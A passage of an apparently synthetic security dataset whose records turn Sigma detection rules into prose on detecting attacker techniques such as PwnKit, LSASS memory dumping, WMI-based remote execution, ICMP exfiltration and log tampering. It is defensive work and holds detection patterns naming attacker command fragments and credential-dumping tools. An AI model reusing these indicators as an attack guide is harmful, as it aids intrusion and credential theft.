      "answer": "In order to detect potential PwnKit exploitation CVE-2021-4034 in auth logs, you should: Focus on authentication log files generated by Linux systems. Specifically, look for any of the following suspicious activities: usage of the 'pkexec' command, indications that the environment variable XAUTHORITY contains suspicious content, or logs containing both '[USER=root]' and '[TTY=/dev/pts/0]'. The detection of any of these activities may signify potential exploitation of the vulnerability. The tags related to this type of attack include Persistence, Privilege Escalation, and Defense Evasion techniques. It's important to note that while this method aims for precise identification of malicious behavior, some legitimate actions might occasionally trigger these indicators, though such false positives are currently unknown. This approach is tagged as high level due to the severity implication of successful exploitation."
    }
  },
  {
    "instruction": "How to detect: usage of the SysInternals Procdump utility",
    "context": "",
    "output": "In order to detect usage of the SysInternals Procdump utility, you should: Monitor process creation logs in Windows systems for instances where processes end with '\\procdump.exe' or '\\procdump64.exe', indicating the execution of the SysInternals Procdump utility. It is essential to be aware that this utility can also be used legitimately by developers or administrators, so not all detections necessarily represent malicious activity. The detection significance is considered medium due to the potential for both benign and malicious use of Procdump.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the SysInternals Procdump utility",
      "answer": "In order to detect usage of the SysInternals Procdump utility, you should: Monitor process creation logs in Windows systems for instances where processes end with '\\procdump.exe' or '\\procdump64.exe', indicating the execution of the SysInternals Procdump utility. It is essential to be aware that this utility can also be used legitimately by developers or administrators, so not all detections necessarily represent malicious activity. The detection significance is considered medium due to the potential for both benign and malicious use of Procdump."
    }
  },
  {
    "instruction": "How to detect: suspicious IIS module registration as described in Microsoft threat report on IIS backdoors",
    "context": "",
    "output": "In order to detect a suspicious IIS module registration as described in Microsoft threat report on IIS backdoors, you should: focus on monitoring process creation logs within Windows systems. Specifically, be on the lookout for activities initiated by the parent process 'w3wp.exe', which is associated with IIS worker processes. The detection process involves identifying commands related to suspicious activities, including the use of 'appcmd.exe' to add modules, operations involving 'system.enterpriseservices.internal.publish' in conjunction with PowerShell (powershell.exe), or the use of 'gacutil' with the '/I' option, indicating an installation operation. Given the high-security risks associated with unauthorized IIS module registration, which can enable attackers to establish persistence or perform malicious activities discretely, any matches to these conditions should be treated with caution. However, it's important to consider that similar activities might occasionally be part of legitimate administrative tasks, so validating the context of these detections is essential to avoid false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious IIS module registration as described in Microsoft threat report on IIS backdoors",
      "answer": "In order to detect a suspicious IIS module registration as described in Microsoft threat report on IIS backdoors, you should: focus on monitoring process creation logs within Windows systems. Specifically, be on the lookout for activities initiated by the parent process 'w3wp.exe', which is associated with IIS worker processes. The detection process involves identifying commands related to suspicious activities, including the use of 'appcmd.exe' to add modules, operations involving 'system.enterpriseservices.internal.publish' in conjunction with PowerShell (powershell.exe), or the use of 'gacutil' with the '/I' option, indicating an installation operation. Given the high-security risks associated with unauthorized IIS module registration, which can enable attackers to establish persistence or perform malicious activities discretely, any matches to these conditions should be treated with caution. However, it's important to consider that similar activities might occasionally be part of legitimate administrative tasks, so validating the context of these detections is essential to avoid false positives."
    }
  },
  {
    "instruction": "Please help me detect the following: Exfiltration Over Alternative Protocol - ICMP. Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.",
    "context": "",
    "output": "Sure!\nIn order to detect Exfiltration Over Alternative Protocol - ICMP, where adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel, you should focus on monitoring PowerShell scripts in Windows environments. Ensure that Script Block Logging is enabled to capture the PowerShell activities. Specifically, look for scripts that create a new object instance followed by initiating a ping using the 'System.Net.NetworkInformation.Ping' class and then sending it. This behavior could indicate an attempt to use ICMP for data exfiltration, which is not typical for standard PowerShell usage. Be aware, though, that legitimate scripts might also use the Ping class for valid purposes, so consider this when assessing alerts. This approach targets intermediate-level threats and helps to identify suspicious activities related to alternative data exfiltration methods.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Exfiltration Over Alternative Protocol - ICMP. Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.",
      "answer": "In order to detect Exfiltration Over Alternative Protocol - ICMP, where adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel, you should focus on monitoring PowerShell scripts in Windows environments. Ensure that Script Block Logging is enabled to capture the PowerShell activities. Specifically, look for scripts that create a new object instance followed by initiating a ping using the 'System.Net.NetworkInformation.Ping' class and then sending it. This behavior could indicate an attempt to use ICMP for data exfiltration, which is not typical for standard PowerShell usage. Be aware, though, that legitimate scripts might also use the Ping class for valid purposes, so consider this when assessing alerts. This approach targets intermediate-level threats and helps to identify suspicious activities related to alternative data exfiltration methods."
    }
  },
  {
    "instruction": "Explain how should I detect the following: possible collection of data from the clipboard via execution of the osascript binary",
    "context": "",
    "output": "In order to detect possible collection of data from the clipboard via execution of the osascript binary, you should: Monitor the creation of processes on macOS systems, paying special attention to instances where the command line contains 'osascript' alongside ' -e ' and 'clipboard'. This indicates the osascript binary is being used, possibly to manipulate or access the clipboard contents. Given the context, such activity is regarded with high suspicion, and under normal circumstances, false positives are considered unlikely. It\u2019s crucial to capture and review the full command line arguments in these events to understand the full scope of the action being performed. This detection strategy is crucial for identifying potential unauthorized access to sensitive data stored temporarily in the clipboard by attackers leveraging macOS system functionalities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "possible collection of data from the clipboard via execution of the osascript binary",
      "answer": "In order to detect possible collection of data from the clipboard via execution of the osascript binary, you should: Monitor the creation of processes on macOS systems, paying special attention to instances where the command line contains 'osascript' alongside ' -e ' and 'clipboard'. This indicates the osascript binary is being used, possibly to manipulate or access the clipboard contents. Given the context, such activity is regarded with high suspicion, and under normal circumstances, false positives are considered unlikely. It\u2019s crucial to capture and review the full command line arguments in these events to understand the full scope of the action being performed. This detection strategy is crucial for identifying potential unauthorized access to sensitive data stored temporarily in the clipboard by attackers leveraging macOS system functionalities."
    }
  },
  {
    "instruction": "Can you explain how to detect: specific PowerShell command line pattern used by the UNC2452 actors as mentioned in Microsoft and Symantec reports",
    "context": "",
    "output": "Certainly!\n\nIn order to detect a specific PowerShell command line pattern used by the UNC2452 actors as mentioned in Microsoft and Symantec reports, you should: Monitor for the creation of processes on Windows systems, specifically looking for command line patterns that indicate the execution of sophisticated commands. These include patterns where PowerShell is used to invoke a WMI method for process creation, evidenced by commands that contain phrases like 'Invoke-WMIMethod win32_process -name create -argumentlist', combined with 'rundll32 c:\\windows'. Additionally, watch for uses of WMIC to remotely create processes, signaled by the presence of 'wmic /node:' followed closely by 'process call create \"rundll32 c:\\windows'. Such command patterns are critical indicators of the tactics, techniques, and procedures associated with the UNC2452 actors, highlighting potential malicious activity likely not related to regular, day-to-day operations of Windows-based environments. Detected occurrences should be treated with a high level of scrutiny due to the unlikely nature of false positives at this critical level of detection. This approach focuses on identifying potential breaches or misuse aligned with techniques that correspond to initial access, execution, and persistence, thus aiding in the timely mitigation of threats associated with these sophisticated adversary tactics.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "specific PowerShell command line pattern used by the UNC2452 actors as mentioned in Microsoft and Symantec reports",
      "answer": "In order to detect a specific PowerShell command line pattern used by the UNC2452 actors as mentioned in Microsoft and Symantec reports, you should: Monitor for the creation of processes on Windows systems, specifically looking for command line patterns that indicate the execution of sophisticated commands. These include patterns where PowerShell is used to invoke a WMI method for process creation, evidenced by commands that contain phrases like 'Invoke-WMIMethod win32_process -name create -argumentlist', combined with 'rundll32 c:\\windows'. Additionally, watch for uses of WMIC to remotely create processes, signaled by the presence of 'wmic /node:' followed closely by 'process call create \"rundll32 c:\\windows'. Such command patterns are critical indicators of the tactics, techniques, and procedures associated with the UNC2452 actors, highlighting potential malicious activity likely not related to regular, day-to-day operations of Windows-based environments. Detected occurrences should be treated with a high level of scrutiny due to the unlikely nature of false positives at this critical level of detection. This approach focuses on identifying potential breaches or misuse aligned with techniques that correspond to initial access, execution, and persistence, thus aiding in the timely mitigation of threats associated with these sophisticated adversary tactics."
    }
  },
  {
    "instruction": "How can I detect: method to load DLL via LSASS process using an undocumented Registry key",
    "context": "",
    "output": "In order to detect a method to load DLL via LSASS process using an undocumented Registry key, you should: Monitor registry events on Windows systems specifically for modifications to the registry keys '\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt' and '\\CurrentControlSet\\Services\\NTDS\\LsaDbExtPt'. These modifications might indicate attempts to use these undocumented registry keys for the purpose of loading Dynamic Link Libraries (DLLs) into the Local Security Authority Subsystem Service (LSASS) process. It is crucial to exclude events related to the legitimate LSASS executable path 'C:\\Windows\\system32\\lsass.exe' when it loads DLLs from the expected locations '%%systemroot%%\\system32\\ntdsa.dll' and '%%systemroot%%\\system32\\lsadb.dll', as these are recognized and permitted operations. While conducting this monitoring, be aware that false positives are possible and currently classified as unknown; thus, each detected event should be thoroughly investigated. As this behavior is associated with malicious activity, namely the exploitation of systems by loading unauthorized DLLs to manipulate the LSASS process, the alert level for such detections is categorized as high. This method is a tactic employed by adversaries to achieve persistence, execute code, and potentially escalate privileges by injecting malicious code into a process that is critical for the Windows operation, hence its high severity.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "method to load DLL via LSASS process using an undocumented Registry key",
      "answer": "In order to detect a method to load DLL via LSASS process using an undocumented Registry key, you should: Monitor registry events on Windows systems specifically for modifications to the registry keys '\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt' and '\\CurrentControlSet\\Services\\NTDS\\LsaDbExtPt'. These modifications might indicate attempts to use these undocumented registry keys for the purpose of loading Dynamic Link Libraries (DLLs) into the Local Security Authority Subsystem Service (LSASS) process. It is crucial to exclude events related to the legitimate LSASS executable path 'C:\\Windows\\system32\\lsass.exe' when it loads DLLs from the expected locations '%%systemroot%%\\system32\\ntdsa.dll' and '%%systemroot%%\\system32\\lsadb.dll', as these are recognized and permitted operations. While conducting this monitoring, be aware that false positives are possible and currently classified as unknown; thus, each detected event should be thoroughly investigated. As this behavior is associated with malicious activity, namely the exploitation of systems by loading unauthorized DLLs to manipulate the LSASS process, the alert level for such detections is categorized as high. This method is a tactic employed by adversaries to achieve persistence, execute code, and potentially escalate privileges by injecting malicious code into a process that is critical for the Windows operation, hence its high severity."
    }
  },
  {
    "instruction": "How can I detect: usage of the \"Import-Module\" cmdlet to load the \"Microsoft.ActiveDirectory.Management.dl\" DLL. Which is often used by attackers to perform AD enumeration.",
    "context": "",
    "output": "In order to detect usage of the \"Import-Module\" cmdlet to load the \"Microsoft.ActiveDirectory.Management.dll\" DLL, which is often used by attackers to perform AD enumeration, you should: Focus on monitoring Windows PowerShell module activity logs. Specifically, keep an eye out for instances where there is usage of cmdlets that include either 'Import-Module ' or its alias 'ipmo ' in their payload. This is an indication that an external module is being loaded into the PowerShell session. Additionally, be particularly vigilant for any occurrences where the 'Microsoft.ActiveDirectory.Management.dll' is being loaded. The combination of these two detection vectors\u2014loading of the specific DLL through the 'Import-Module' cmdlet or its alias\u2014acts as a strong indicator of AD enumeration attempts.\n\nBear in mind that while this activity can be malicious in nature, especially given its association with AD enumeration efforts by attackers, there can also be legitimate scenarios where administrative activities necessitate the use of 'Microsoft.ActiveDirectory.Management.dll'. Thus, any detections should be carefully reviewed for context to ascertain whether they represent genuine threat activities or benign administrative operations. The nature of these incidents is categorized at a medium level, emphasizing the need for a balanced approach to investigation. Monitoring for this kind of activity helps protect against tactics and techniques linked to Discovery and Lateral Movement, leveraging the capability to enumerate Active Directory resources as a means to further an attacker's objectives within a compromised environment.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the \"Import-Module\" cmdlet to load the \"Microsoft.ActiveDirectory.Management.dl\" DLL. Which is often used by attackers to perform AD enumeration.",
      "answer": "In order to detect usage of the \"Import-Module\" cmdlet to load the \"Microsoft.ActiveDirectory.Management.dll\" DLL, which is often used by attackers to perform AD enumeration, you should: Focus on monitoring Windows PowerShell module activity logs. Specifically, keep an eye out for instances where there is usage of cmdlets that include either 'Import-Module ' or its alias 'ipmo ' in their payload. This is an indication that an external module is being loaded into the PowerShell session. Additionally, be particularly vigilant for any occurrences where the 'Microsoft.ActiveDirectory.Management.dll' is being loaded. The combination of these two detection vectors\u2014loading of the specific DLL through the 'Import-Module' cmdlet or its alias\u2014acts as a strong indicator of AD enumeration attempts.\n\nBear in mind that while this activity can be malicious in nature, especially given its association with AD enumeration efforts by attackers, there can also be legitimate scenarios where administrative activities necessitate the use of 'Microsoft.ActiveDirectory.Management.dll'. Thus, any detections should be carefully reviewed for context to ascertain whether they represent genuine threat activities or benign administrative operations. The nature of these incidents is categorized at a medium level, emphasizing the need for a balanced approach to investigation. Monitoring for this kind of activity helps protect against tactics and techniques linked to Discovery and Lateral Movement, leveraging the capability to enumerate Active Directory resources as a means to further an attacker's objectives within a compromised environment."
    }
  },
  {
    "instruction": "How to detect: use of CreateMiniDump hack tool used to dump the LSASS process memory for credential extraction on the attacker's machine",
    "context": "",
    "output": "In order to detect the use of CreateMiniDump hack tool used to dump the LSASS process memory for credential extraction on the attacker's machine, you should: focus on monitoring the creation of processes within a Windows environment. This involves looking for instances where the process name ends with '\\CreateMiniDump.exe', indicating the possible execution of the CreateMiniDump hack tool. Additionally, attention should be paid to specific indicators of compromise (IOCs) such as the image hash (imphash) '4a07f944a83e8a7c2525efa35dd30e2f' or if any hash associated with a process contains this imphash value. These specific imphash values are tied to the known malicious tool and significantly increase the confidence in detecting unauthorized extraction of credentials from the LSASS process memory. It is categorized with a high level of severity, but one should be aware that there may be unknown false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of CreateMiniDump hack tool used to dump the LSASS process memory for credential extraction on the attacker's machine",
      "answer": "In order to detect the use of CreateMiniDump hack tool used to dump the LSASS process memory for credential extraction on the attacker's machine, you should: focus on monitoring the creation of processes within a Windows environment. This involves looking for instances where the process name ends with '\\CreateMiniDump.exe', indicating the possible execution of the CreateMiniDump hack tool. Additionally, attention should be paid to specific indicators of compromise (IOCs) such as the image hash (imphash) '4a07f944a83e8a7c2525efa35dd30e2f' or if any hash associated with a process contains this imphash value. These specific imphash values are tied to the known malicious tool and significantly increase the confidence in detecting unauthorized extraction of credentials from the LSASS process memory. It is categorized with a high level of severity, but one should be aware that there may be unknown false positives."
    }
  },
  {
    "instruction": "Explain how should I detect the following: audio capture via PowerShell Cmdlet.",
    "context": "",
    "output": "In order to detect audio capture via PowerShell Cmdlet, you should: Focus on monitoring the creation of processes within Windows environments. Specifically, look for instances where the command line invokes certain PowerShell commands indicative of audio device manipulation. These include 'WindowsAudioDevice-Powershell-Cmdlet', 'Toggle-AudioDevice', 'Get-AudioDevice ', 'Set-AudioDevice ', and 'Write-AudioDevice '. It's crucial to be aware that there might be legitimate uses of these commands for audio capture by authorized users, which are considered as potential false positives. The severity of this detection is rated as medium, suggesting a balanced approach to the scrutiny of these process creations for signs of unauthorized audio capture activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "audio capture via PowerShell Cmdlet.",
      "answer": "In order to detect audio capture via PowerShell Cmdlet, you should: Focus on monitoring the creation of processes within Windows environments. Specifically, look for instances where the command line invokes certain PowerShell commands indicative of audio device manipulation. These include 'WindowsAudioDevice-Powershell-Cmdlet', 'Toggle-AudioDevice', 'Get-AudioDevice ', 'Set-AudioDevice ', and 'Write-AudioDevice '. It's crucial to be aware that there might be legitimate uses of these commands for audio capture by authorized users, which are considered as potential false positives. The severity of this detection is rated as medium, suggesting a balanced approach to the scrutiny of these process creations for signs of unauthorized audio capture activities."
    }
  },
  {
    "instruction": "How to detect: tampering with EventLog service \"file\" key. In order to change the default location of an Evtx file. This technique is used to tamper with log collection and alerting",
    "context": "",
    "output": "In order to detect tampering with EventLog service \"file\" key in order to change the default location of an Evtx file, a technique used to tamper with log collection and alerting, you should focus on monitoring registry set operations within Windows environments. Specifically, watch for events where the registry value is being set (`SetValue` EventType) under the paths that contain `\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\` and specifically target objects that end with `\\File`. This is indicative of attempts to modify the location where event log files are stored, potentially to evade detection or undermine log integrity.\n\nHowever, it's crucial to exclude any activities that involve the `\\System32\\Winevt\\Logs\\` directory in the `Details` field of the event, as these could represent legitimate behavior and thus, are not indicative of the targeted tampering activity.\n\nMaintaining vigilance for these specific condition combinations is essential for identifying potential security incidents related to the alteration of the event log storage path, which could compromise the reliability of log-based security monitoring. Given the high level of concern usually associated with such attempts, all detected instances should be taken seriously, though it's acknowledged that not all detections might indicate malicious activity and the context should always be considered.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "tampering with EventLog service \"file\" key. In order to change the default location of an Evtx file. This technique is used to tamper with log collection and alerting",
      "answer": "In order to detect tampering with EventLog service \"file\" key in order to change the default location of an Evtx file, a technique used to tamper with log collection and alerting, you should focus on monitoring registry set operations within Windows environments. Specifically, watch for events where the registry value is being set (`SetValue` EventType) under the paths that contain `\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\` and specifically target objects that end with `\\File`. This is indicative of attempts to modify the location where event log files are stored, potentially to evade detection or undermine log integrity.\n\nHowever, it's crucial to exclude any activities that involve the `\\System32\\Winevt\\Logs\\` directory in the `Details` field of the event, as these could represent legitimate behavior and thus, are not indicative of the targeted tampering activity.\n\nMaintaining vigilance for these specific condition combinations is essential for identifying potential security incidents related to the alteration of the event log storage path, which could compromise the reliability of log-based security monitoring. Given the high level of concern usually associated with such attempts, all detected instances should be taken seriously, though it's acknowledged that not all detections might indicate malicious activity and the context should always be considered."
    }
  },
  {
    "instruction": "How can I detect: usage of the built-in PowerShell cmdlet \"Enable-WindowsOptionalFeature\" used as a Deployment Image Servicing and Management tool.\nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images\n",
    "context": "",
    "output": "In order to detect usage of the built-in PowerShell cmdlet \"Enable-WindowsOptionalFeature\" used as a Deployment Image Servicing and Management tool, similar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images, you should: monitor Windows PowerShell script logs specifically looking for the use of the \"Enable-WindowsOptionalFeature\" cmdlet along with parameters '-Online' and '-FeatureName'. This aims to catch when someone is attempting to enable Windows features or packages potentially for malicious purposes. Specifically, pay attention to the enabling of features such as 'TelnetServer', 'Internet-Explorer-Optional-amd64', 'TFTP', 'SMB1Protocol', 'Client-ProjFS', and 'Microsoft-Windows-Subsystem-Linux', as these could be indicative of an adversary's attempt to install insecure or unusual Windows features. The monitoring process involves ensuring that Script Block Logging is enabled in Windows to capture the PowerShell command execution. Be aware that there could be legitimate use cases for enabling these features, so consider this to minimize potential false positives. The detection strategy is leveled at a medium severity, indicating a balanced approach to identifying potentially harmful activity without causing undue alarm for normal system administration tasks.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the built-in PowerShell cmdlet \"Enable-WindowsOptionalFeature\" used as a Deployment Image Servicing and Management tool.\nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images\n",
      "answer": "In order to detect usage of the built-in PowerShell cmdlet \"Enable-WindowsOptionalFeature\" used as a Deployment Image Servicing and Management tool, similar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images, you should: monitor Windows PowerShell script logs specifically looking for the use of the \"Enable-WindowsOptionalFeature\" cmdlet along with parameters '-Online' and '-FeatureName'. This aims to catch when someone is attempting to enable Windows features or packages potentially for malicious purposes. Specifically, pay attention to the enabling of features such as 'TelnetServer', 'Internet-Explorer-Optional-amd64', 'TFTP', 'SMB1Protocol', 'Client-ProjFS', and 'Microsoft-Windows-Subsystem-Linux', as these could be indicative of an adversary's attempt to install insecure or unusual Windows features. The monitoring process involves ensuring that Script Block Logging is enabled in Windows to capture the PowerShell command execution. Be aware that there could be legitimate use cases for enabling these features, so consider this to minimize potential false positives. The detection strategy is leveled at a medium severity, indicating a balanced approach to identifying potentially harmful activity without causing undue alarm for normal system administration tasks."
    }
  },
  {
    "instruction": "How to detect: remote thread creation of Ttdinject.exe used as proxy",
    "context": "",
    "output": "In order to detect a remote thread creation of Ttdinject.exe used as proxy, you should: Monitor Windows log sources for events where a remote thread creation occurs with the specific characteristic of having a source image that ends with '\\ttdinject.exe'. This detection points to an operation where the Ttdinject.exe is possibly being used as a proxy, which is indicative of a potentially malicious activity. Due to the nature of this detection, the confidence level is high, albeit with a recognition that there might be unknown scenarios where this pattern does not indicate malicious behavior. This approach is framed within the context of identifying and responding to techniques related to executing code remotely on a system.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "remote thread creation of Ttdinject.exe used as proxy",
      "answer": "In order to detect a remote thread creation of Ttdinject.exe used as proxy, you should: Monitor Windows log sources for events where a remote thread creation occurs with the specific characteristic of having a source image that ends with '\\ttdinject.exe'. This detection points to an operation where the Ttdinject.exe is possibly being used as a proxy, which is indicative of a potentially malicious activity. Due to the nature of this detection, the confidence level is high, albeit with a recognition that there might be unknown scenarios where this pattern does not indicate malicious behavior. This approach is framed within the context of identifying and responding to techniques related to executing code remotely on a system."
    }
  },
  {
    "instruction": "How can I detect: modification of autostart extensibility point (ASEP) in registry.",
    "context": "",
    "output": "In order to detect modification of autostart extensibility point (ASEP) in registry, you should focus on monitoring registry setting activities on Windows systems specifically. You need to look for events where the registry has been modified to set new values under the path `\\Software\\Policies\\Microsoft\\Windows\\System\\Scripts`. These modifications can involve setting values related to startup, shutdown, logon, and logoff scripts. Furthermore, you should only consider modifications that do not have \"(Empty)\" in the Details field as part of the suspicious activity, filtering out potential false positives.\n\nFor tracking, the key pieces of information to log would be the Security ID of the account making the change, the name of the object modified, and both the old and new value types of the registry. \n\nHowever, it's crucial to keep in mind common false positives which might arise from legitimate software, which often sets autorun keys during installation, or from legitimate administrator activities where changes to autorun keys are made for benign reasons. This scenario has a medium level of urgency in terms of addressing potential threats.\n\nThe related MITRE ATT&CK tactics and techniques you are dealing with include Persistence, Privilege Escalation, and Execution. Monitoring for this type of modification helps in identifying unauthorized or malicious changes that could allow malware or an attacker to automatically execute scripts during various system states, aiding in maintaining persistence, elevating privileges, or executing malicious programs without direct user initiation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "modification of autostart extensibility point (ASEP) in registry.",
      "answer": "In order to detect modification of autostart extensibility point (ASEP) in registry, you should focus on monitoring registry setting activities on Windows systems specifically. You need to look for events where the registry has been modified to set new values under the path `\\Software\\Policies\\Microsoft\\Windows\\System\\Scripts`. These modifications can involve setting values related to startup, shutdown, logon, and logoff scripts. Furthermore, you should only consider modifications that do not have \"(Empty)\" in the Details field as part of the suspicious activity, filtering out potential false positives.\n\nFor tracking, the key pieces of information to log would be the Security ID of the account making the change, the name of the object modified, and both the old and new value types of the registry. \n\nHowever, it's crucial to keep in mind common false positives which might arise from legitimate software, which often sets autorun keys during installation, or from legitimate administrator activities where changes to autorun keys are made for benign reasons. This scenario has a medium level of urgency in terms of addressing potential threats.\n\nThe related MITRE ATT&CK tactics and techniques you are dealing with include Persistence, Privilege Escalation, and Execution. Monitoring for this type of modification helps in identifying unauthorized or malicious changes that could allow malware or an attacker to automatically execute scripts during various system states, aiding in maintaining persistence, elevating privileges, or executing malicious programs without direct user initiation."
    }
  },
  {
    "instruction": "Explain how should I detect the following: execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section",
    "context": "",
    "output": "In order to detect execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section, you should: Monitor the process creation logs in Windows systems for any instances where the process 'C:\\Windows\\System32\\wpbbin.exe' is initiated. This specific file execution is associated with sophisticated persistence mechanisms that leverage the Unified Extensible Firmware Interface (UEFI), making it a critical point of detection for potential security breaches. Given the nature of this detection, it's tagged with tactics and techniques commonly observed in system persistence efforts and may include manipulation of UEFI firmware. Be aware that there are scenarios where this file may be legitimately used, particularly by certain hardware manufacturers like Lenovo. Therefore, while this detection is set to a high level of alert, it's important to investigate the context of its execution to rule out false positives associated with valid usage.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section",
      "answer": "In order to detect execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section, you should: Monitor the process creation logs in Windows systems for any instances where the process 'C:\\Windows\\System32\\wpbbin.exe' is initiated. This specific file execution is associated with sophisticated persistence mechanisms that leverage the Unified Extensible Firmware Interface (UEFI), making it a critical point of detection for potential security breaches. Given the nature of this detection, it's tagged with tactics and techniques commonly observed in system persistence efforts and may include manipulation of UEFI firmware. Be aware that there are scenarios where this file may be legitimately used, particularly by certain hardware manufacturers like Lenovo. Therefore, while this detection is set to a high level of alert, it's important to investigate the context of its execution to rule out false positives associated with valid usage."
    }
  },
  {
    "instruction": "How can I detect: Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users.\nAccounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts.\n",
    "context": "",
    "output": "In order to prevent adversaries from interrupting the availability of system and network resources by inhibiting access to accounts utilized by legitimate users through actions such as deleting, locking, or manipulating accounts (e.g., changing credentials), you should focus on monitoring PowerShell script logs on Windows systems. Specifically, ensure that Script Block Logging is enabled to capture detailed logging information. Look for scripts that contain the commands `Remove-ADGroupMember` along with both parameters `-Identity ` and `-Members `. This combination indicates an attempt to remove members from Active Directory groups, which could be part of an attack to deny access to certain accounts or resources. Be aware that there may be instances where these commands are used legitimately, though such scenarios are considered unknown false positives. The severity level of this activity is medium, implying that while it may not directly indicate a breach, it is suspicious enough to warrant investigation. Understanding these signs and being proactive in detection can help in mitigating threats aimed at disrupting legitimate user access to network resources and accounts.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users.\nAccounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts.\n",
      "answer": "In order to prevent adversaries from interrupting the availability of system and network resources by inhibiting access to accounts utilized by legitimate users through actions such as deleting, locking, or manipulating accounts (e.g., changing credentials), you should focus on monitoring PowerShell script logs on Windows systems. Specifically, ensure that Script Block Logging is enabled to capture detailed logging information. Look for scripts that contain the commands `Remove-ADGroupMember` along with both parameters `-Identity ` and `-Members `. This combination indicates an attempt to remove members from Active Directory groups, which could be part of an attack to deny access to certain accounts or resources. Be aware that there may be instances where these commands are used legitimately, though such scenarios are considered unknown false positives. The severity level of this activity is medium, implying that while it may not directly indicate a breach, it is suspicious enough to warrant investigation. Understanding these signs and being proactive in detection can help in mitigating threats aimed at disrupting legitimate user access to network resources and accounts."
    }
  },
  {
    "instruction": "How to detect: source system failing to authenticate against a remote host with multiple users.",
    "context": "",
    "output": "In order to detect a source system failing to authenticate against a remote host with multiple users, you should focus on monitoring Windows security event logs, specifically targeting event ID 4625, which signifies a failed login attempt. Pay attention to situations where the logon type is 3, indicating a network logon failure. However, it is essential to exclude any events where the IP address is not recorded, as these do not help in identifying the source of the failed authentication attempts.\n\nFor accurate detection, you should aggregate failed login attempts over a 24-hour period and identify any IP address associated with more than 10 failed login attempts targeting different user accounts. This could indicate an unauthorized entity trying to gain access by brute force or guessing passwords of multiple users from a single source system.\n\nBe aware that there are legitimate use cases, such as terminal servers, jump servers, Citrix server farms, or workstations where users change frequently, which might exhibit similar behavior but are not malicious. These should be considered potential false positives and should be carefully reviewed to avoid misinterpretation of the data.\n\nUnderstanding the associated tactics and techniques, such as Credential Access and Brute Force, might also help in contextualizing and responding to these events more effectively. This approach of focusing on specific log entries, filtering out known benign scenarios, and applying a threshold for anomaly detection can significantly enhance your organization's ability to identify potentially malicious activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "source system failing to authenticate against a remote host with multiple users.",
      "answer": "In order to detect a source system failing to authenticate against a remote host with multiple users, you should focus on monitoring Windows security event logs, specifically targeting event ID 4625, which signifies a failed login attempt. Pay attention to situations where the logon type is 3, indicating a network logon failure. However, it is essential to exclude any events where the IP address is not recorded, as these do not help in identifying the source of the failed authentication attempts.\n\nFor accurate detection, you should aggregate failed login attempts over a 24-hour period and identify any IP address associated with more than 10 failed login attempts targeting different user accounts. This could indicate an unauthorized entity trying to gain access by brute force or guessing passwords of multiple users from a single source system.\n\nBe aware that there are legitimate use cases, such as terminal servers, jump servers, Citrix server farms, or workstations where users change frequently, which might exhibit similar behavior but are not malicious. These should be considered potential false positives and should be carefully reviewed to avoid misinterpretation of the data.\n\nUnderstanding the associated tactics and techniques, such as Credential Access and Brute Force, might also help in contextualizing and responding to these events more effectively. This approach of focusing on specific log entries, filtering out known benign scenarios, and applying a threshold for anomaly detection can significantly enhance your organization's ability to identify potentially malicious activities."
    }
  },
  {
    "instruction": "Explain how should I detect the following: S3 Browser utility creating IAM User or AccessKey.",
    "context": "",
